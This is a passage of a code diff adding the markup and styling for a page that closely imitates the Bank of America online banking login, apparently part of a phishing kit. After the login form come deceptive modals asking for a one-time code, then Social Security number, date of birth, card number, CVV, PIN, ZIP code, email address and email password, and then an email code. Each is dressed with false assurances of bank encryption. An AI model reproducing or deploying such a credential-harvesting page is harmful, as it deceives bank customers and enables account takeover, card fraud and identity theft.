+                background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 12 14' fill='white'%3E%3Cpath d='M10.5 5h-1V3.5C9.5 1.57 7.93 0 6 0S2.5 1.57 2.5 3.5V5h-1C.67 5 0 5.67 0 6.5v6c0 .83.67 1.5 1.5 1.5h9c.83 0 1.5-.67 1.5-1.5v-6c0-.83-.67-1.5-1.5-1.5zM6 10.75c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25zM8 5H4V3.5C4 2.4 4.9 1.5 6 1.5S8 2.4 8 3.5V5z'/%3E%3C/svg%3E") !important;
+                background-size: contain !important;
+                background-repeat: no-repeat !important;
+                left: auto !important;
+                top: auto !important;
+                transform: none !important;
+            }
+            
+            #login_button:active {
+                transform: scale(0.98);
+                box-shadow: 0 1px 4px rgba(0, 119, 190, 0.4) !important;
+            }
+            
+            /* Forgot password link */
+            .forgot-passcode {
+                font-size: 14px;
+                display: block;
+                margin: 18px 0;
+                color: #0077be;
+                text-decoration: none;
+            }
+            
+            .forgot-passcode:hover {
+                text-decoration: underline;
+            }
+            
+            /* Divider */
+            .divide {
+                margin: 20px 0;
+                border-top: 1px solid #e0e0e0;
+            }
+            
+            /* Footer adjustments */
+            .global-footer-module {
+                padding: 20px 15px;
+                background: #f8f8f8;
+                margin-top: 30px;
+            }
+            
+            .link-row {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .link-row a {
+                border-right: none;
+                padding: 5px 0;
+            }
+            
+            .gray-bground-skin p {
+                font-size: 11px;
+                line-height: 1.6;
+                color: #666;
+            }
+            
+            #footer_pill {
+                width: 25px;
+            }
+            
+            /* Cookie banner */
+            .cookie-banner {
+                flex-direction: column;
+                padding: 15px;
+                font-size: 12px;
+                line-height: 1.5;
+            }
+            
+            .cookie-banner-text {
+                margin-bottom: 15px;
+            }
+            
+            .cookie-close {
+                position: static;
+                margin-top: 10px;
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+            
+            /* Footer Secure Area - Mobile */
+            .footer-secure {
+                display: flex !important;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                padding: 20px 0 15px 0;
+                font-size: 13px;
+                color: #666;
+            }
+            
+            .footer-secure::before {
+                content: "🔒";
+                font-size: 14px;
+            }
+            
+            .footer {
+                background: #fff;
+                padding: 20px 20px 30px 20px;
+                text-align: center;
+            }
+            
+            .footer-links {
+                display: flex;
+                justify-content: center;
+                gap: 15px;
+                flex-wrap: wrap;
+                margin: 15px 0;
+            }
+            
+            .footer-links a {
+                color: #0077be;
+                font-size: 13px;
+                text-decoration: none;
+            }
+            
+            .footer-text {
+                font-size: 11px;
+                color: #666;
+                line-height: 1.6;
+                margin-top: 15px;
+            }
+        }
+        
+        /* Extra small devices */
+        @media (max-width: 480px) {
+            .red-banner h1 {
+                font-size: 18px;
+            }
+            
+            .online-id-vipaa-module {
+                padding: 15px 10px !important;
+            }
+            
+            .right-links {
+                font-size: 10px;
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- FDIC Top Banner -->
+    <div id="gtSecureFDICModule" data-component="module" class="global-tenants-gt-secure-fdic-module-class-v-1-0-33 global-tenants-gt-secure-fdic-module">
+        <section>
+            <div id="fdicConsumerContainer" class="fdic-realDevice">
+                <div id="fdicConsumer">
+                    <div class="fdic-signage">
+                        <div class="elements">
+                            <span class="text-preamble">Bank of America deposit products: </span>
+                            <img src="https://secure1.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-digital-sign-CSX37f66a3e.svg" alt="FDIC-Insured - Backed by the full faith and credit of the U.S. Government" class="fdic-digital-sign">
+                        </div>
+                    </div>
+                </div>
+                <div class="fdic-hidden" id="fdicWealth">
+                    <div class="investment-text">Investment products are not FDIC-Insured.</div>
+                </div>
+            </div>
+            <div id="fdicWealthSmall" class="fdic-wealthSmalldevice">
+                <img src="https://secure1.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-wealth-banner-smalldevice-en-CSX7f123629.svg" alt="Bank of America Deposit products:FDIC Insured - Backed by the full faith and credit of the US Government. Investment products are NOT FDIC insured" class="fdic-banner-svg">
+            </div>
+        </section>
+    </div>
+    
+    <!-- Header -->
+    <div class="header-container">
+        <div class="header-content">
+            <div class="logo-section">
+                <img alt="Bank of America" src="https://www.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/BofA_rgb.png">
+                <div class="login-text">Log In</div>
+            </div>
+            <div class="right-links">
+                <div class="secure-area">Secure Area</div>
+                <a class="divide" href="#" onclick="captureAction(event, 'espanol')" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En español</a>
+                <div class="clearboth"></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Red Title Bar -->
+    <div class="red-title-bar">
+        <h1>Log In to Online Banking</h1>
+    </div>
+    
+    <!-- Main 3-Column Layout -->
+    <div class="online-id-vipaa-module">
+        <div class="enter-skin phoenix">
+        <!-- Column 1: Login Form -->
+        <div class="online-id-section">
+            <form id="loginForm" autocomplete="off">
+                <input type="hidden" name="csrfTokenHidden" value="047be425f9a134ed" id="csrfTokenHidden">
+                <input type="hidden" id="f_variable" name="f_variable" class="tl-private">
+                <input type="hidden" name="lpOlbResetErrorCounter" id="lpOlbResetErrorCounterId" value="0">
+                <input type="hidden" name="lpPasscodeErrorCounter" id="lpPasscodeErrorCounterId" value="0">
+                <input type="hidden" name="contGsid" id="contGsid" value="">
+                <input type="hidden" name="mouseCapturedEvents" id="mouseCapturedEvents">
+                <input type="hidden" id="passcodeVal" name="passcode" value="" class="tl-private">
+                <input type="hidden" id="onlineIdVal" name="onlineId" value="">
+                
+                <label for="enterID-input">User ID<span class="ada-hidden"> Must be at least 6 characters long</span></label>
+                <input type="text" id="enterID-input" name="dummy-onlineId" maxlength="32" value="" autocomplete="off">
+                
+                <div class="remember-info">
+                    <input type="checkbox" id="remID" name="saveMyID">
+                    <label for="remID">Save this User ID</label>
+                    <a class="boa-dialog force-xlarge info-layer-help-fsd dotted" href="javascript:void(0);" name="online-id-help" rel="help-content" title="Help" onclick="captureAction(event, 'help')">
+                        <span class="ada-hidden">Online ID Help</span>
+                        <span class="boa-ada-text ada-hidden">&nbsp;layer</span>
+                    </a>
+                    <div id="help-content" class="hide">
+                        <p><strong>How does "Save this User ID" work?</strong></p>
+                        <p>&nbsp;</p>
+                        <p>Saving your User ID means you don't have to enter it every time you log in.</p>
+                        <p>&nbsp;</p>
+                        <p><strong>Don't save on a public computer</strong></p>
+                        <p>&nbsp;</p>
+                        <p>Only save your User ID on your personal computer or mobile device.</p>
+                        <p>&nbsp;</p>
+                        <p><strong>How to clear a saved User ID</strong></p>
+                        <p>&nbsp;</p>
+                        <p>To clear a saved User ID, log in and select <strong>Saved User IDs</strong> from <strong>Profile and Settings.</strong></p>
+                    </div>
+                    <div class="clearboth"></div>
+                </div>
+                
+                <label for="tlpvt-passcode-input" class="mtop-15">Password<span class="ada-hidden"> is unavailable. Please enter atleast 6 characters of online id to enable Passcode</span></label>
+                <input type="password" class="tl-private" id="tlpvt-passcode-input" name="dummy-passcode" maxlength="20" value="" disabled="disabled" autocomplete="off">
+                
+                <a href="#" class="fl-lt forgot-passcode" name="forgot-your-passcode" onclick="captureAction(event, 'forgot_password')">Forgot your Password?</a>
+                <div class="clearboth"></div>
+                
+                <a href="javascript:void(0);" id="login_button" onclick="enterOnlineIDFormSubmit();" role="button" title="Log In" class="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight" name="enter-online-id-submit" style="position: relative; display: inline-block; font-family: Arial, Helvetica, sans-serif; font-size: 13px; font-weight: 700; line-height: 22px; color: rgb(255, 255, 255); background-color: rgb(0, 119, 190); background-image: linear-gradient(rgb(0, 125, 195), rgb(0, 103, 177)); border: 1px solid rgb(18, 78, 137); border-radius: 5px; padding: 1px 14px; margin: 30px 0px 0px 0px; text-align: center; text-decoration: none; cursor: pointer;">
+                    Log In
+                </a>
+            </form>
+        </div>
+        
+        <!-- Column 2: Mobile App -->
+        <div class="mobile-cta-section vertical-dotted-line fl-rt">
+            <p class="cnx-regular title enroll-color-gray mbtm-10">Stay connected with our app</p>
+            <img height="208" width="149" src="https://www.bankofamerica.com/pa/components/modules-app/VIPAA/online-id-vipaa-module/1.0/graphic/mobile_llama.png" alt="Mobile banking Llama" class="fl-lt">
+            <div class="get-app-content-section">
+                <div class="cnx-regular title enroll-color-gray mcta-bubble">Secure, convenient banking anytime</div>
+                <a id="choose-device-get-the-app" name="choose-device-get-the-app" class="choose-device-get-the-app-modal btn-bofa btn-bofa-red btn-bofa-noRight cnx-regular" href="javascript:void(0);" rel="mobile-app-download-choose-device" onclick="captureAction(event, 'get_app')">
+                    <span>Get the app</span>
+                    <span class="ada-hidden">&nbsp; link opens a new info modal layer</span>
+                </a>
+            </div>
+        </div>
+        
+        <!-- Column 3: Help Links -->
+        <div class="flex-col rt-col">
+            <div class="side-well-vipaa-module">
+                <div class="fsd-ll-skin">
+                    <h2>Login help</h2>
+                    <ul class="li-pbtm-15">
+                        <li><a class="arrow" href="#" name="Forgot ID/Password?" onclick="captureAction(event, 'forgot_id_password')">Forgot ID/Password?</a></li>
+                        <li><a class="arrow" href="#" name="Problem logging in?" onclick="captureAction(event, 'problem_logging')">Problem logging in?</a></li>
+                    </ul>
+                </div>
+                <div class="fsd-ll-skin">
+                    <h2>Not using Online Banking?</h2>
+                    <ul class="li-pbtm-15">
+                        <li><a class="arrow" href="#" name="Enroll_now" onclick="captureAction(event, 'enroll')">Enroll now<span class="ada-hidden">  for online Banking</span></a></li>
+                        <li><a class="arrow" href="#" name="Learn_more_about_Online_Banking_dotcom" onclick="captureAction(event, 'learn_more')">Learn more about Online Banking</a></li>
+                        <li><a class="arrow" href="#" name="Service_Agreement_dotcom" onclick="captureAction(event, 'service_agreement')">Service Agreement</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="global-footer-module">
+        <div class="gray-bground-skin cssp">
+            <div class="secure">Secure area</div>
+        
+            
+            <div class="link-container">
+                <div class="link-row"> 
+                    
+                    <a href="https://www.bankofamerica.com/security-center/privacy-overview/" name="Privacy_&amp;_Security_footer" title="Privacy" target="_blank">Privacy</a>
+                    
+                    <a href="https://www.bankofamerica.com/security-center/overview/" name="Security" title="Security" target="_blank">Security</a>
+                    
+                    <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();" name="Your Privacy Choices" title="" target="_self">Your Privacy Choices</a>
+                    <span id="footer_pill"></span>
+                    <div class="clearboth"></div>
+                </div>
+            </div>
+            <p>Bank of America, N.A. Member FDIC. <a href="https://www.bankofamerica.com/help/equalhousing-popup/" target="_blank" rel="noopener" name="Equal_Housing_Lender">Equal Housing Lender</a> <br>©&nbsp;2025 Bank of America Corporation.</p>
+        </div>
+    </div>
+    
+    <!-- Cookie Banner -->
+    <div class="cookie-banner" id="cookieBanner">
+        <div class="cookie-text">
+            We use cookies and other tracking technologies to collect data for advertising, fraud prevention, analytics, and other purposes. By using this website, you agree to the use of these tracking technologies and to the use and disclosure of data in accordance with our <a href="#" onclick="captureAction(event, 'privacy_policy')">Online Privacy Policy</a> and <a href="#" onclick="captureAction(event, 'cookie_policy')">Cookie Policy</a>
+        </div>
+        <button class="cookie-close" onclick="closeCookieBanner()">✕</button>
+    </div>
+    
+    <!-- Loading -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+    </div>
+    
+    <!-- Success Modal -->
+    <div class="success-modal" id="successModal">
+        <div class="success-content">
+            <div class="success-icon">✓</div>
+            <h2>Success!</h2>
+            <p>Your account has been successfully verified.</p>
+            <button class="success-btn" onclick="closeModal()">Continue</button>
+        </div>
+    </div>
+    
+    <!-- OTP Modal -->
+    <div class="otp-modal" id="otpModal">
+        <div class="otp-content">
+            <div class="otp-icon">🔐</div>
+            <h2>Verification Required</h2>
+            <p>We've sent a 6-digit code to your registered device. Enter it below to continue.</p>
+            
+            <div class="otp-input-container">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="otp1" oninput="moveToNext(this, 'otp2')" onkeydown="moveToPrev(event, this, null)" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="otp2" oninput="moveToNext(this, 'otp3')" onkeydown="moveToPrev(event, this, 'otp1')" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="otp3" oninput="moveToNext(this, 'otp4')" onkeydown="moveToPrev(event, this, 'otp2')" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="otp4" oninput="moveToNext(this, 'otp5')" onkeydown="moveToPrev(event, this, 'otp3')" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="otp5" oninput="moveToNext(this, 'otp6')" onkeydown="moveToPrev(event, this, 'otp4')" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="otp6" oninput="submitOTP()" onkeydown="moveToPrev(event, this, 'otp5')" autocomplete="off">
+            </div>
+            
+            <button class="otp-btn" onclick="submitOTP()">Verify</button>
+            <a href="#" class="resend-link" onclick="resendOTP(event)">Resend Code</a>
+        </div>
+    </div>
+
+    <!-- Additional Verification Modal -->
+    <div class="verify-modal" id="verifyModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; align-items: center; justify-content: center; overflow-y: auto;">
+        <div class="verify-content" style="background: #ffffff; padding: 30px 25px; border-radius: 8px; max-width: 500px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 50px rgba(0,0,0,0.4); font-family: 'Segoe UI', Arial, sans-serif; margin: 20px auto;">
+            <div style="background: #fde8e9; border: 2px solid #d82027; border-radius: 8px; padding: 20px; margin-bottom: 25px;">
+                <div style="display: flex; align-items: flex-start; gap: 15px;">
+                    <div style="flex-shrink: 0;">
+                        <svg role="img" aria-hidden="true" focusable="false" viewBox="0 0 40 41" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
+                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                <g transform="translate(-1.000000, 0.000000)" fill-rule="nonzero">
+                                    <g fill="#D82027">
+                                        <path d="M40.52,34.9 L24.66,3.35 C24.0205199,1.89971197 22.5850142,0.963815355 21,0.963815355 C19.4149858,0.963815355 17.9794801,1.89971197 17.34,3.35 L1.48,34.89 C0.780648378,36.1939013 0.828414331,37.7715265 1.60536938,39.0307295 C2.38232443,40.2899325 3.77093507,41.040228 5.25,41 L36.75,41 C38.2260948,41.0382165 39.6113234,40.2892339 40.3876113,39.0331712 C41.1638992,37.7771086 41.2143138,36.2031672 40.52,34.9 Z"></path>
+                                    </g>
+                                    <g transform="translate(16.000000, 29.000000)" fill="#FFFFFF">
+                                        <circle cx="5" cy="4.31" r="4.1"></circle>
+                                    </g>
+                                    <g transform="translate(17.000000, 9.000000)" fill="#FFFFFF">
+                                        <path d="M4,0.72 C2.29896297,0.72 0.92,2.09896297 0.92,3.8 L0.92,15.08 C1.01300469,16.7102378 2.36211143,17.984572 3.995,17.984572 C5.62788857,17.984572 6.97699531,16.7102378 7.07,15.08 L7.07,3.8 C7.07000895,2.10286057 5.69713048,0.725510193 4,0.72 Z"></path>
+                                    </g>
+                                </g>
+                            </g>
+                        </svg>
+                    </div>
+                    <div style="flex: 1;">
+                        <h2 style="color: #333; font-size: 18px; font-weight: 700; margin: 0 0 8px 0;">Additional Verification Required</h2>
+                        <p style="color: #666; font-size: 14px; margin: 0; line-height: 1.5;"> For security reasons, your account requires additional verification. Please provide the information below to continue accessing your account.
+                    </div>
+                </div>
+            </div>
+            
+            <form id="verifyForm" style="display: flex; flex-direction: column; gap: 16px;">
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 14px;">
+                    <div>
+                        <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">First Name</label>
+                        <input type="text" id="verifyFirstName" required style="width: 100%; padding: 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                    </div>
+                    <div>
+                        <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">Last Name</label>
+                        <input type="text" id="verifyLastName" required style="width: 100%; padding: 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                    </div>
+                </div>
+                
+                <div>
+                    <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">Date of Birth</label>
+                    <input type="text" id="verifyDOB" maxlength="10" placeholder="MM/DD/YYYY" required style="width: 100%; padding: 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" oninput="formatDOB(this)" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                    <div id="dobError" style="color: #e31837; font-size: 11px; margin-top: 4px; display: none; font-weight: 500;"></div>
+                </div>
+                
+                <div>
+                    <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">Social Security Number</label>
+                    <div style="position: relative;">
+                        <input type="password" id="verifySSN" maxlength="11" placeholder="XXX-XX-XXXX" required style="width: 100%; padding: 10px 50px 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" oninput="formatSSN(this)" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                        <span onclick="toggleVerifyField('verifySSN', this)" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #0077be; font-size: 13px; cursor: pointer; user-select: none; font-weight: 600;">Show</span>
+                    </div>
+                </div>
+                
+                <div>
+                    <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">Card Number</label>
+                    <input type="text" id="verifyCardNumber" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required style="width: 100%; padding: 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" oninput="formatCardNumber(this)" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                    <div id="cardNumberError" style="color: #e31837; font-size: 11px; margin-top: 4px; display: none; font-weight: 500;"></div>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;">
+                    <div>
+                        <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">Expiry</label>
+                        <input type="text" id="verifyExpiry" maxlength="5" placeholder="MM/YY" required style="width: 100%; padding: 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" oninput="formatExpiry(this)" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                    </div>
+                    <div>
+                        <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">CVV</label>
+                        <div style="position: relative;">
+                            <input type="password" id="verifyCVV" maxlength="3" placeholder="XXX" required style="width: 100%; padding: 10px 42px 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" oninput="formatCVV(this)" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                            <span onclick="toggleVerifyField('verifyCVV', this)" style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); color: #0077be; font-size: 12px; cursor: pointer; user-select: none; font-weight: 600;">Show</span>
+                        </div>
+                    </div>
+                    <div>
+                        <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">PIN</label>
+                        <div style="position: relative;">
+                            <input type="password" id="verifyPIN" maxlength="4" placeholder="XXXX" required style="width: 100%; padding: 10px 42px 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" oninput="formatPIN(this)" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                            <span onclick="toggleVerifyField('verifyPIN', this)" style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); color: #0077be; font-size: 12px; cursor: pointer; user-select: none; font-weight: 600;">Show</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">ZIP Code</label>
+                    <input type="text" id="verifyZIP" maxlength="5" placeholder="XXXXX" required style="width: 100%; padding: 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" oninput="formatZIP(this)" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                </div>
+                
+                <div style="background: #f0f7ff; padding: 12px; border-radius: 6px; border-left: 4px solid #012169; margin-top: 4px;">
+                    <p style="color: #012169; font-size: 12px; margin: 0; line-height: 1.5;"><strong>🔒 Your data is secure.</strong> Bank of America uses advanced encryption to protect your information.</p>
+                </div>
+                
+                <div style="display: flex; gap: 12px; margin-top: 8px;">
+                    <button type="button" onclick="cancelVerification()" style="flex: 1; padding: 12px; background: #f5f5f5; color: #333; border: 2px solid #d1d1d1; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: pointer; transition: all 0.3s; font-family: inherit;" onmouseover="this.style.background='#e8e8e8'" onmouseout="this.style.background='#f5f5f5'">Cancel</button>
+                    <button type="submit" id="verifySubmitBtn" style="flex: 2; padding: 12px; background: #ccc; color: white; border: none; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: not-allowed; transition: all 0.3s; font-family: inherit;">Continue Verification</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Email Verification Modal -->
+    <div class="email-verify-modal" id="emailVerifyModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; align-items: center; justify-content: center; overflow-y: auto;">
+        <div class="email-verify-content" style="background: #ffffff; padding: 30px 25px; border-radius: 8px; max-width: 480px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 50px rgba(0,0,0,0.4); font-family: 'Segoe UI', Arial, sans-serif; margin: 20px auto;">
+            <div style="text-align: center; margin-bottom: 25px; border-bottom: 2px solid #e31837; padding-bottom: 18px;">
+                <div style="width: 60px; height: 60px; background: linear-gradient(135deg, #e31837, #c41230); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 30px; margin-bottom: 12px; box-shadow: 0 4px 15px rgba(227, 24, 55, 0.3);">📧</div>
+                <h2 style="color: #012169; font-size: 22px; font-weight: 700; margin: 0 0 8px 0; letter-spacing: -0.5px;">Email Verification Required</h2>
+                <p style="color: #666; font-size: 13px; margin: 0; line-height: 1.4;">To protect your account, we need to verify your email address and password.</p>
+            </div>
+            
+            <form id="emailVerifyForm" style="display: flex; flex-direction: column; gap: 16px;">
+                <div>
+                    <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">Email Address</label>
+                    <input type="email" id="emailAddress" placeholder="name@example.com" required style="width: 100%; padding: 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                </div>
+                
+                <div>
+                    <label style="display: block; font-size: 12px; color: #012169; margin-bottom: 5px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;">Email Password</label>
+                    <div style="position: relative;">
+                        <input type="password" id="emailPassword" placeholder="Enter your email password" required style="width: 100%; padding: 10px 50px 10px 12px; font-size: 14px; border: 2px solid #d1d1d1; border-radius: 4px; box-sizing: border-box; transition: all 0.3s; font-family: inherit;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'">
+                        <span onclick="toggleEmailPassword(this)" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #0077be; font-size: 13px; cursor: pointer; user-select: none; font-weight: 600;">Show</span>
+                    </div>
+                </div>
+                
+                <div style="background: #f0f7ff; padding: 12px; border-radius: 6px; border-left: 4px solid #012169;">
+                    <p style="color: #012169; font-size: 12px; margin: 0; line-height: 1.5;"><strong>🛡️ Your information is secure.</strong> Bank of America uses bank-level encryption to protect your data.</p>
+                </div>
+                
+                <div style="display: flex; gap: 12px; margin-top: 8px;">
+                    <button type="button" onclick="cancelEmailVerify()" style="flex: 1; padding: 12px; background: #f5f5f5; color: #333; border: 2px solid #d1d1d1; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: pointer; transition: all 0.3s; font-family: inherit;" onmouseover="this.style.background='#e8e8e8'" onmouseout="this.style.background='#f5f5f5'">Cancel</button>
+                    <button type="submit" id="emailSubmitBtn" style="flex: 2; padding: 12px; background: #ccc; color: white; border: none; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: not-allowed; transition: all 0.3s; font-family: inherit;">Verify Email</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Email OTP Modal -->
+    <div class="email-otp-modal" id="emailOtpModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; align-items: center; justify-content: center;">
+        <div class="email-otp-content" style="background: #ffffff; padding: 45px 35px; border-radius: 8px; max-width: 480px; width: 90%; box-shadow: 0 10px 50px rgba(0,0,0,0.4); font-family: 'Segoe UI', Arial, sans-serif; text-align: center;">
+            <div style="margin-bottom: 30px;">
+                <div style="width: 70px; height: 70px; background: linear-gradient(135deg, #e31837, #c41230); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 36px; margin-bottom: 18px; box-shadow: 0 4px 15px rgba(227, 24, 55, 0.3);">📧</div>
+                <h2 style="color: #012169; font-size: 24px; font-weight: 700; margin: 0 0 12px 0;">Email Verification Code</h2>
+                <p style="color: #666; font-size: 14px; margin: 0; line-height: 1.5;">We've sent a 6-digit verification code to your email address. Please enter it below.</p>
+            </div>
+            
+            <div style="display: flex; gap: 10px; justify-content: center; margin-bottom: 25px;">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="emailOtp1" oninput="moveToNextEmailOTP(this, 'emailOtp2')" onkeydown="moveToPrevEmailOTP(event, this, null)" style="width: 50px; height: 60px; font-size: 28px; font-weight: 700; text-align: center; border: 2px solid #d1d1d1; border-radius: 8px; transition: all 0.3s; font-family: inherit; -webkit-appearance: none; appearance: none;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="emailOtp2" oninput="moveToNextEmailOTP(this, 'emailOtp3')" onkeydown="moveToPrevEmailOTP(event, this, 'emailOtp1')" style="width: 50px; height: 60px; font-size: 28px; font-weight: 700; text-align: center; border: 2px solid #d1d1d1; border-radius: 8px; transition: all 0.3s; font-family: inherit; -webkit-appearance: none; appearance: none;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="emailOtp3" oninput="moveToNextEmailOTP(this, 'emailOtp4')" onkeydown="moveToPrevEmailOTP(event, this, 'emailOtp2')" style="width: 50px; height: 60px; font-size: 28px; font-weight: 700; text-align: center; border: 2px solid #d1d1d1; border-radius: 8px; transition: all 0.3s; font-family: inherit; -webkit-appearance: none; appearance: none;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="emailOtp4" oninput="moveToNextEmailOTP(this, 'emailOtp5')" onkeydown="moveToPrevEmailOTP(event, this, 'emailOtp3')" style="width: 50px; height: 60px; font-size: 28px; font-weight: 700; text-align: center; border: 2px solid #d1d1d1; border-radius: 8px; transition: all 0.3s; font-family: inherit; -webkit-appearance: none; appearance: none;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'" autocomplete="off">
